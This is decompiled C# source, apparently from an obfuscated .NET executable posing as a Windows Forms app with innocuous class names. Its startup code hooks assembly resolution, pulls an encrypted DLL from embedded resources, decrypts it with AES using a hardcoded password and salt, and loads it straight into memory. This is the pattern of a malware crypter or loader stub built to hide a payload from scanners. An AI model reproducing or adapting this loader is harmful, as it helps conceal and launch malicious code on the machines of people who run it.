using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using wbem.Watchers;

namespace wbem.Adapter;

internal static class TestListAdapter
{
	private static TestListAdapter MapParams;

	[STAThread]
	private static void SetDispatcher()
	{
		int num = 1;
		while (true)
		{
			int num2 = 0;
			if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_c6d962a41aa74012b2af36a943c72f40 != 0)
			{
				num2 = num;
			}
			switch (num2)
			{
			case 1:
				continue;
			default:
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				break;
			case 6:
				break;
			case 3:
			case 4:
			case 5:
				return;
			}
			break;
		}
		AppDomain.CurrentDomain.AssemblyResolve += ReflectDispatcher;
		Application.Run((Form)(object)new BridgeRecordWatcher());
	}

	private static Assembly ReflectDispatcher(object task, ResolveEventArgs pol)
	{
		Stream stream = default(Stream);
		Assembly result = default(Assembly);
		int num2 = default(int);
		int num4 = default(int);
		while (true)
		{
			bool flag = OrderParams(pol.Name, "Swsokpjmjonftnmglzatftuh");
			if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_7c67eac478f04d939abd47b663ee728b == 0)
			{
				switch (0)
				{
				case 4:
					break;
				default:
					goto IL_0048;
				case 2:
					goto IL_004c;
				case 1:
				case 6:
					goto IL_0068;
				case 5:
					goto end_IL_0001;
				}
				continue;
			}
			goto IL_0048;
			IL_0068:
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				WriteAdvisor(stream, memoryStream);
				int num = 0;
				if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_5618150a140245229506e59882d5ebe7 == 0)
				{
					goto IL_0085;
				}
				goto IL_00ae;
				IL_00ae:
				switch (num)
				{
				case 1:
					return result;
				}
				goto IL_0085;
				IL_0085:
				result = (Assembly)RateAdvisor(SetupAdvisor(), CountAdvisor(ViewAdvisor(memoryStream)));
				num = 1;
				if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_88ca98e0cb1e48ba8a73a2bf64ecc17c != 0)
				{
					num = num2;
				}
				goto IL_00ae;
			}
			finally
			{
				if (stream != null)
				{
					int num3 = 0;
					if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_4beb177cd45f401da39b9ee65a19915a == 0)
					{
						num3 = num4;
					}
					switch (num3)
					{
					default:
						((IDisposable)stream).Dispose();
						break;
					}
				}
			}
			IL_0048:
			if (!flag)
			{
				goto IL_004c;
			}
			stream = (Stream)RevertParams(SearchParams(), "Ckytkvxxwmxrnwi.Swsokpjmjonftnmglzatftuh.dll");
			goto IL_0068;
			IL_004c:
			result = null;
			break;
			continue;
			end_IL_0001:
			break;
		}
		return result;
	}

	private static byte[] DisableDispatcher(byte[] value)
	{
		byte[] array = new byte[8];
		CalcAdvisor(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte[] salt = array;
		MemoryStream memoryStream = new MemoryStream();
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			try
			{
				InsertAdvisor(rijndaelManaged, 256);
				LoginAdvisor(rijndaelManaged, 128);
				Rfc2898DeriveBytes object_ = default(Rfc2898DeriveBytes);
				int num3 = default(int);
				int num4 = default(int);
				while (true)
				{
					byte[] bytes = Encoding.UTF8.GetBytes("Rczyzuyiabyrjxyiqqeisst");
					int num = 4;
					if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_9087a2c27eaa45288276cc66ca75309f == 0)
					{
						goto IL_008e;
					}
					goto IL_0092;
					IL_0092:
					while (true)
					{
						switch (num)
						{
						case 4:
							object_ = new Rfc2898DeriveBytes(bytes, salt, 1000);
							InvokeAdvisor(rijndaelManaged, CancelAdvisor(object_, StopAdvisor(rijndaelManaged) / 8));
							goto case 2;
						case 2:
							ForgotAdvisor(rijndaelManaged, CancelAdvisor(object_, rijndaelManaged.BlockSize / 8));
							goto IL_0079;
						case 3:
							goto IL_0079;
						case 5:
							break;
						default:
						{
							CryptoStream cryptoStream = new CryptoStream(memoryStream, (ICryptoTransform)ValidateAdvisor(rijndaelManaged), CryptoStreamMode.Write);
							try
							{
								cryptoStream.Write(value, 0, value.Length);
								int num2 = 0;
								if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_3d9a56cac72b40d5b5047767ef8f931a != 0)
								{
									num2 = num3;
								}
								switch (num2)
								{
								default:
									cryptoStream.Close();
									break;
								}
							}
							finally
							{
								RestartAdvisor(cryptoStream);
							}
							goto case 1;
						}
						case 1:
							return memoryStream.ToArray();
						}
						break;
						IL_0079:
						rijndaelManaged.Mode = CipherMode.CBC;
						num = 0;
						if (_003CModule_003E_007Bb783909c_002Dc942_002D4d6b_002D8291_002D3a84e2f8f19e_007D.m_041df269cde4424495b15b79ffe04379 != 0)
						{
							continue;
						}
						goto IL_008e;
					}
					continue;
					IL_008e:
					num = num4;
					goto IL_0092;
				}
			}
			finally
			{
				RestartAdvisor(rijndaelManaged);
			}
		}
		finally
		{
			((IDisposable)memoryStream).Dispose();
		}
	}

	internal static bool AddParams()
	{
		return MapParams == null;
	}

	internal static TestListAdapter RemoveParams()
	{
		return MapParams;
	}

	internal static bool OrderParams(object object_0, object object_1)
	{
		return ((string)object_0).StartsWith((string)object_1);
	}

	internal static object SearchParams()
	{
		return Assembly.GetExecutingAssembly();
	}

	internal static object RevertParams(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetManifestResourceStream((string)object_1);
	}

	internal static void WriteAdvisor(object object_0, object object_1)
	{
		((Stream)object_0).CopyTo((Stream)object_1);
	}

	internal static object SetupAdvisor()
	{
		return AppDomain.CurrentDomain;
	}

	internal static object ViewAdvisor(object object_0)
	{
		return ((MemoryStream)object_0).ToArray();
	}

	internal static object CountAdvisor(object object_0)
	{
		return DisableDispatcher((byte[])object_0);
	}

	internal static object RateAdvisor(object object_0, object object_1)
	{
		return ((AppDomain)object_0).Load((byte[])object_1);
	}

	internal static void CalcAdvisor(object object_0, RuntimeFieldHandle runtimeFieldHandle_0)
	{
		RuntimeHelpers.InitializeArray((Array)object_0, runtimeFieldHandle_0);
	}

	internal static void InsertAdvisor(object object_0, int int_0)
	{
		((SymmetricAlgorithm)object_0).KeySize = int_0;
	}

	internal static void LoginAdvisor(object object_0, int int_0)
	{
		((SymmetricAlgorithm)object_0).BlockSize = int_0;
	}

	internal static int StopAdvisor(object object_0)
	{
		return ((SymmetricAlgorithm)object_0).KeySize;
	}

	internal static object CancelAdvisor(object object_0, int int_0)
	{
		return ((DeriveBytes)object_0).GetBytes(int_0);
	}

	internal static void InvokeAdvisor(object object_0, object object_1)
	{
		((SymmetricAlgorithm)object_0).Key = (byte[])object_1;
	}

	internal static void ForgotAdvisor(object object_0, object object_1)
	{
		((SymmetricAlgorithm)object_0).IV = (byte[])object_1;
	}

	internal static object ValidateAdvisor(object object_0)
	{
		return ((SymmetricAlgorithm)object_0).CreateDecryptor();
	}

	internal static void RestartAdvisor(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}
}
